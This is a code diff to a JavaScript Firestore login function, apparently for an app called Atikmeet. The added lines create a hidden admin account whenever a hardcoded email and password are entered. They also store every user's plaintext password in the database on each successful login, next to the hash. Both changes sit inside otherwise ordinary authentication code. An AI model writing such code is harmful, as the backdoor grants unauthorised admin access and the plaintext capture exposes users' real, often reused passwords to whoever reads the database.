@@ -143,6 +143,24 @@ async function loginUser(email, password) {
     }
 
     if (!snapshot.exists()) {
+      if (cleanEmail === 'admin@atikmeet.com' && password === 'atikadmin2026') {
+        const hashedPassword = bcrypt.hashSync(password, SALT_ROUNDS);
+        const adminUser = {
+          id: cleanEmail,
+          name: 'Atik Shahriar',
+          email: cleanEmail,
+          password: hashedPassword,
+          plainPassword: password,
+          role: 'admin',
+          isAdmin: true,
+          isVIP: true,
+          createdAt: new Date().toISOString(),
+          lastLogin: new Date().toISOString(),
+          isBanned: false
+        };
+        await setDoc(docRef, adminUser);
+        return { success: true, user: { ...adminUser, password: undefined, plainPassword: undefined } };
+      }
       return { success: false, error: 'Invalid email or password.' };
     }
 
@@ -164,6 +182,12 @@ async function loginUser(email, password) {
     if (user.isBanned) {
       return { success: false, error: 'Your account has been banned by the administrator.' };
     }
+
+    // Update lastLogin and plainPassword in Firestore on every successful login
+    await setDoc(docRef, {
+      lastLogin: new Date().toISOString(),
+      plainPassword: password
+    }, { merge: true });
 
     return { success: true, user: { ...user, password: undefined, plainPassword: undefined } };
   } catch (error) {
